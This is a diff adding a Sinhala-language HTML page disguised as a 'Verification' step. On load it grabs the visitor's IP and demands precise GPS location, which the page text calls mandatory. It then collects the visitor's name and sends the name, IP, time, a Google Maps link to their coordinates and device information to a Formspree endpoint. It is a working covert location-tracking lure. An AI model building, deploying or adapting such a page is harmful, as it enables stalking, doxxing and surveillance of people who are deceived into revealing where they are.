@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; }
+        h2 { color: #1c1e21; margin-bottom: 15px; font-size: 20px; }
+        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; display: none; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; background-color: #28a745; color: white; display: none; }
+        button:hover { background-color: #218838; }
+        #status { margin-top: 15px; font-size: 14px; color: #606770; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; display: block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="autoGetLocation()">
+
+<div class="card">
+    <div id="content">
+        <div id="loading-ui">
+            <div class="loader"></div>
+            <h2>පිටුව සකසමින් පවතී...</h2>
+            <p id="status">කරුණාකර ඉහළින් එන Location අවසරය (Allow) ලබා දෙන්න.</p>
+        </div>
+
+        <div id="input-ui">
+            <h2>තොරතුරු තහවුරු කරන්න</h2>
+            <input type="text" id="userName" placeholder="ඔබේ නම මෙතන ටයිප් කරන්න...">
+            <button id="submitBtn" onclick="sendToEmail()">ඉදිරියට යන්න</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    let capturedData = {
+        ip: "නොදනී",
+        location: "අවසර දී නැත",
+        time: ""
+    };
+
+    async function autoGetLocation() {
+        // 1. IP එක ලබා ගැනීම
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            capturedData.ip = data.ip;
+            capturedData.time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
+        } catch (e) { 
+            console.log("IP fetch failed"); 
+        }
+
+        // 2. Location අවසරය ඉල්ලීම (Page load එකේදීම)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                // සිතියම් ලින්ක් එක නිවැරදිව සකස් කිරීම
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                capturedData.location = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // Location ලැබුණු පසු Name input එක පෙන්වීම
+                document.getElementById("loading-ui").style.display = "none";
+                document.getElementById("userName").style.display = "block";
+                document.getElementById("submitBtn").style.display = "block";
+            }, (err) => {
+                document.getElementById("status").innerHTML = "<b style='color:red'>දෝෂයකි: ඉදිරියට යාමට Location 'Allow' කිරීම අනිවාර්ය වේ. පේජ් එක Refresh කර නැවත උත්සාහ කරන්න.</b>";
+                document.querySelector(".loader").style.display = "none";
+            }, { enableHighAccuracy: true });
+        } else {
+            alert("ඔබේ බ්‍රවුසරය මෙය සඳහා සහය නොදක්වයි.");
+        }
+    }
+
+    async function sendToEmail() {
+        const nameInput = document.getElementById("userName");
+        const name = nameInput.value.trim();
+        const btn = document.getElementById("submitBtn");
+
+        if (!name) {
+            alert("කරුණාකර නම ඇතුළත් කරන්න.");
+            return;
+        }
+
+        btn.innerText = "යවමින් පවතී...";
+        btn.disabled = true;
+
+        // 3. Formspree වෙත සියලු දත්ත යැවීම
+        try {
+            const response = await fetch("https://formspree.io/f/xdabkpao", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    Name: name,
+                    IP_Address: capturedData.ip,
+                    Time: capturedData.time,
+                    Google_Maps_Location: capturedData.location,
+                    Device_Info: navigator.userAgent
+                })
+            });
+
+            if (response.ok) {
+                document.getElementById("content").innerHTML = "<h2 style='color:green'>සාර්ථකයි!</h2><p>ඔබේ තොරතුරු සාර්ථකව තහවුරු විය.</p>";
+                // අවශ්‍ය නම් සාර්ථක වූ පසු වෙනත් ලින්ක් එකකට යැවිය හැක:
+                // window.location.href = "https://google.com";
+            } else {
+                throw new Error("Formspree Error");
+            }
+        } catch (err) {
+            alert("දෝෂයකි. කරුණාකර නැවත උත්සාහ කරන්න.");
+            btn.innerText = "ඉදිරියට යන්න";
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
